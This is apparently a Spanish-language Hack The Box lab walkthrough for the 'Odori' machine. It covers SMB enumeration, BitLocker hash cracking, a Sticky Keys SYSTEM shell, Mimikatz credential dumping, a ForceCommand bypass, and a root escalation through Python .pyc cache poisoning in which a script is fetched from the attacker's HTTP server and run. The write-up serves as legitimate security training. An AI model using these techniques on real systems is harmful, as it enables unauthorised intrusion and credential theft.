# **Hack The Box — Odori | Walkthrough**

Linux / Windows

SMB

SFTP

Privilege Escalation

## **1. Introducción**

En este walkthrough documentaré el proceso de resolución de la máquina **Odori** de Hack The Box, desde la enumeración inicial hasta la obtención de privilegios de administrador (`root`).

La máquina combina técnicas de análisis forense, recuperación de credenciales, evasión de restricciones SSH y escalada de privilegios mediante la manipulación de archivos compilados de Python.

**Objetivo:** obtener acceso al sistema, comprometer la cuenta `svc_backup`, escalar privilegios a `root` y recuperar las flags `user.txt` y `root.txt`.

### **Técnicas utilizadas**

- Enumeración de servicios con Nmap.
- Enumeración de recursos compartidos SMB.
- Análisis de una imagen VMDK cifrada con BitLocker.
- Recuperación de credenciales de Windows.
- Bypass de restricciones SSH mediante SFTP.
- Identificación de tareas programadas ejecutadas como root.
- Python Bytecode Cache Poisoning (`.pyc`).

Los pasos iniciales de análisis forense se presentan como ruta de referencia; en nuestra conversación comprobamos directamente el acceso por SFTP, la modificación de `restrict` y la escalada final.

## **2. Reconocimiento y enumeración**

### **2.1 Escaneo de puertos**

Comenzamos identificando los servicios expuestos por la máquina objetivo.

```
nmap -sC -sV -Pn -p- 10.129.183.7 -oN nmap.txt
```

Los principales servicios identificados fueron:

| Puerto  | Servicio | Descripción              |
| ------- | -------- | ------------------------ |
| 22/tcp  | SSH      | OpenSSH 8.9p1            |
| 139/tcp | NetBIOS  | Servicio de compartición |
| 445/tcp | SMB      | Samba                    |

La presencia de SMB sugiere que debemos investigar los recursos compartidos para identificar posibles archivos expuestos.

### **2.2 Enumeración de SMB**

Podemos utilizar NetExec para comprobar si el servidor permite acceder sin credenciales.

```
nxc smb 10.129.183.7 -u '' -p '' --shares
```

Entre los recursos compartidos aparece:

```
Share       Permissions
-----       -----------
print$
backup      READ
IPC$
```

El recurso `backup` permite lectura, por lo que podemos acceder con:

```
smbclient //10.129.183.7/backup -N
```

Dentro encontramos el archivo `info.txt`, que contiene una referencia a la imagen de disco VMDK proporcionada en la descripción de la máquina.

**Hallazgo:** el acceso inicial está relacionado con el análisis de una copia de seguridad de Windows, no con la explotación directa de un servicio web.&#x20;

[image](https://www.google.com/s2/favicons?domain=https://exploitnotes.hashnode.dev\&sz=32)

ExploitNotes



## **3. Análisis forense y recuperación de credenciales**

### **3.1 Análisis de la imagen VMDK**

Descargamos la imagen proporcionada por HTB y extraemos su contenido:

```
7z x odori.7z
```

Comprobamos el formato del disco:

```
file file02.vmdk
qemu-img info file02.vmdk
```

El análisis de particiones revela una instalación de Windows con una partición principal protegida mediante BitLocker.

Para recuperar la contraseña de cifrado, extraemos los hashes:

```
bitlocker2john -i file02.vmdk > vm-hash
```

A continuación, utilizamos John the Ripper con el diccionario `rockyou.txt`:

```
john --wordlist=/usr/share/wordlists/rockyou.txt vm-hash
```

La contraseña recuperada en el es: `********************`.

Esto permite desbloquear el disco, pero todavía necesitamos acceder a una cuenta de Windows.&#x20;

[image](https://www.google.com/s2/favicons?domain=https://exploitnotes.hashnode.dev\&sz=32)

ExploitNotes



### **3.2 Acceso a Windows mediante WinRE**

Creamos una máquina virtual utilizando una copia del archivo VMDK y configuramos su red en modo aislado (*Host-only*).

Posteriormente, arrancamos con una ISO de instalación de Windows y accedemos a las opciones de recuperación.

Desde la consola de recuperación identificamos el volumen:

```
diskpart
list volume
select volume 1
assign letter=E
exit
```

Desbloqueamos BitLocker:

```
manage-bde -unlock E: -pw
```

Una vez desbloqueado, el procedimiento aprovecha la función Sticky Keys para obtener una consola SYSTEM en el inicio de sesión.

```
copy E:\Windows\System32\sethc.exe E:\Windows\System32\sethc.exe.bak
copy E:\Windows\System32\cmd.exe E:\Windows\System32\sethc.exe
```

Al reiniciar Windows y presionar `Shift` cinco veces en la pantalla de inicio de sesión, se abre una consola de comandos con privilegios SYSTEM.

### **3.3 Extracción de credenciales**

Una vez dentro de Windows, utilizamos Mimikatz para examinar las credenciales almacenadas:

```
privilege::debug
token::elevate
lsadump::sam
```

Aunque se obtienen hashes NTLM, estos no proporcionan directamente el acceso deseado al servidor Linux.

La pista importante aparece en las credenciales asociadas a tareas programadas de Windows.

```
vault::list
vault::cred /patch
```

La contraseña recuperada corresponde a la cuenta:

```
Usuario: svc_backup
Contraseña: Napping2Curator
```

Esta cuenta se utiliza en una tarea de respaldo mediante SFTP, por lo que constituye el siguiente objetivo para conseguir acceso al servidor Linux.&#x20;

[image](https://www.google.com/s2/favicons?domain=https://exploitnotes.hashnode.dev\&sz=32)

ExploitNotes



## **4. Acceso inicial mediante SFTP**

### **4.1 Conexión SSH restringida**

Intentamos conectarnos:

```
ssh svc_backup@10.129.183.7
```

Sin embargo, aunque las credenciales sean válidas, el servidor restringe las sesiones SSH interactivas.

Por ello, probamos con SFTP:

```
sftp svc_backup@10.129.183.7
```

La conexión SFTP nos permite enumerar archivos y directorios del sistema.

### **4.2 Identificación de la restricción**

Descargamos la configuración SSH:

```
sftp> get /etc/ssh/sshd_config
```

Encontramos una configuración similar a:

```
Match group svc_backup
    ForceCommand /opt/restrict /home/%u
    AllowTcpForwarding no
```

El parámetro `ForceCommand` obliga a ejecutar `/opt/restrict` independientemente del comando solicitado por el cliente.

Al inspeccionar el script encontramos:

```
#!/bin/bash

/usr/lib/openssh/sftp-server -d $1
```

Es decir, cada nueva conexión se redirige al servidor SFTP y no a una terminal interactiva.

### **4.3 Modificación de&#x20;**`restrict`

La vulnerabilidad consiste en que el usuario `svc_backup` puede modificar el archivo que controla su propia restricción.

Creamos una versión modificada:

```
nano restrict
```

Contenido:

```
#!/bin/bash

#/usr/lib/openssh/sftp-server -d $1
bash
```

Después cargamos el archivo mediante SFTP:

```
sftp> put restrict /opt/restrict
```

En mi caso, la transferencia se completó:

```
Uploading restrict to /opt/restrict
restrict 100% 54 0.2KB/s 00:00
```

Con esta modificación, el comando forzado deja de ejecutar el servidor SFTP y pasa a iniciar Bash.

### **4.4 Obtención de una terminal**

Iniciamos una nueva conexión:

```
ssh -tt svc_backup@10.129.183.7
```

Una vez obtenida la terminal, verificamos el usuario:

```
whoami
id
```

Resultado de referencia:

```
uid=1001(svc_backup) gid=1001(svc_backup) groups=1001(svc_backup)
```

Ya tenemos acceso al servidor Linux, aunque todavía sin privilegios de administrador.

**Vulnerabilidad identificada:** configuración insegura de `ForceCommand`, debido a que el script de restricción es modificable por el propio usuario restringido.&#x20;

[image](https://www.google.com/s2/favicons?domain=https://exploitnotes.hashnode.dev\&sz=32)

ExploitNotes



## **5. Obtención de user.txt**

Con acceso a la cuenta `svc_backup`, podemos localizar la primera flag.

```
ls -la /home/svc_backup/
```

La ubicación esperada es:

```
/home/svc_backup/user.txt
```

Para leerla:

```
cat /home/svc_backup/user.txt
```

## **6. Escalada de privilegios a root**

Esta es la parte más importante de la máquina, porque aprovecha el funcionamiento interno de la caché de bytecode de Python.

### **6.1 Enumeración de privilegios**

Comenzamos comprobando los permisos del usuario:

```
sudo -l
```

También buscamos binarios con SUID:

```
find / -perm -4000 -type f 2>/dev/null
```

Como no encontramos un camino útil mediante `sudo`, investigamos procesos y tareas automatizadas.

El análisis mediante `pspy` identifica un proceso que se ejecuta periódicamente con privilegios de root:

```
UID=0 | python3 /opt/archiver/app.py
```

Este proceso se ejecuta aproximadamente cada minuto.

### **6.2 Análisis de&#x20;**`/opt/archiver`

Inspeccionamos el directorio:

```
ls -la /opt/archiver/
```

Se muestra estos elementos relevantes:

```
app.py
helper.py
__pycache__/
```

La aplicación importa una función de `helper.py`:

```
from helper import tar_and_move_files
```

El proceso se encarga de revisar archivos antiguos de `/backup` y archivarlos en `/archive`.

Sin embargo, el directorio `__pycache__` posee permisos de escritura accesibles para usuarios no privilegiados.

**Esto significa que un usuario puede sustituir archivos de bytecode que posteriormente serán cargados por un proceso ejecutado como root.**

### **6.3 Python Bytecode Cache Poisoning**

Python utiliza archivos `.pyc` para almacenar bytecode previamente compilado.

Flujo de la escalada mediante la modificación de la caché de Python.

El archivo vulnerable es:

```
/opt/archiver/__pycache__/helper.cpython-310.pyc
```

El ataque consiste en crear una versión modificada del bytecode que conserve una cabecera válida para el archivo `helper.py`.

Cuando la tarea programada ejecuta `app.py`, Python importa el módulo y ejecuta el código alterado con los privilegios del proceso.

Se confirma que la validación basada en fecha de modificación y tamaño del código fuente permite reutilizar un `.pyc` manipulado sin modificar directamente `helper.py`.&#x20;

[image](https://www.google.com/s2/favicons?domain=https://exploitnotes.hashnode.dev\&sz=32)

ExploitNotes



### **6.4 Automatización de la escalada**

Para evitar realizar manualmente todas las modificaciones del bytecode, utilizamos el script `odori_privesc.py` preparado durante la resolución.

En Parrot OS iniciamos un servidor HTTP:

```
python3 -m http.server 8000 --bind 0.0.0.0
```

Desde la sesión `svc_backup` descargamos el script:

```
wget http://IP_TUN0:8000/odori_privesc.py -O /tmp/odori_privesc.py
```

Posteriormente:

```
python3 /tmp/odori_privesc.py
```

El propósito del script es automatizar la preparación y sustitución del bytecode de Python para que la tarea ejecutada como root genere una copia de Bash con permisos SUID.

El procedimiento utiliza `/tmp/rootbash` como ruta para esa copia privilegiada.

### **6.5 Obtención de root**

Una vez que la tarea programada ejecuta el bytecode manipulado, verificamos el archivo:

```
ls -l /tmp/rootbash
```

El indicador esperado es un binario propiedad de root con el bit SUID activado:

```
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Ejecutamos:

```
/tmp/rootbash -p
```

Y verificamos los privilegios:

```
id
```

El resultado esperado incluye:

```
euid=0(root)
```

Es importante señalar que `uid` puede seguir siendo el del usuario `svc_backup`, pero `euid=0` confirma que la shell está ejecutándose con privilegios efectivos de root.

## **7. Obtención de root.txt**

Una vez obtenida la shell privilegiada, buscamos la flag final.

```
ls -la /root/
```

Para leerla:

```
cat /root/root.txt
```

En caso de desconocer su ubicación:

```
find / -type f -name "root.txt" 2>/dev/null
```

Con la lectura de `root.txt`, se completa el objetivo de la máquina.

## **8. Resumen de la cadena de ataque**

1. **Enumeración:** descubrimiento de SSH y SMB.
2. **Acceso a archivos:** recurso SMB `backup` con lectura anónima.
3. **Análisis forense:** extracción y descifrado de una imagen VMDK protegida por BitLocker.
4. **Recuperación de credenciales:** obtención de la contraseña de `svc_backup` desde Windows.
5. **Acceso inicial:** conexión SFTP y bypass de `ForceCommand` mediante `/opt/restrict`.
6. **Escalada de privilegios:** manipulación de `helper.cpython-310.pyc` para aprovechar una tarea cron de root.
7. **Objetivo final:** shell privilegiada y recuperación de `root.txt`.

## **9. Conclusión personal**

La máquina Odori me permitió comprender mejor cómo una serie de configuraciones inseguras pueden combinarse hasta comprometer completamente un sistema. Una de las partes más interesantes fue descubrir que, aunque una cuenta estuviera limitada a utilizar SFTP, era posible evadir esta restricción debido a los permisos incorrectos del script encargado de controlar el acceso SSH.

Sin embargo, el aprendizaje más importante estuvo en la escalada de privilegios. Antes de resolver esta máquina no había profundizado demasiado en el funcionamiento de los archivos `.pyc` ni en cómo Python utiliza su caché para optimizar las importaciones. Comprendí que proteger únicamente los archivos de código fuente no es suficiente si otros componentes que utiliza una aplicación privilegiada pueden ser modificados por usuarios sin autorización.

También reforcé la importancia de analizar procesos automatizados, permisos de directorios y relaciones entre servicios, en lugar de depender exclusivamente de exploits conocidos. Esta máquina demuestra que la enumeración detallada y la comprensión del funcionamiento de un sistema son fundamentales durante una evaluación de seguridad.
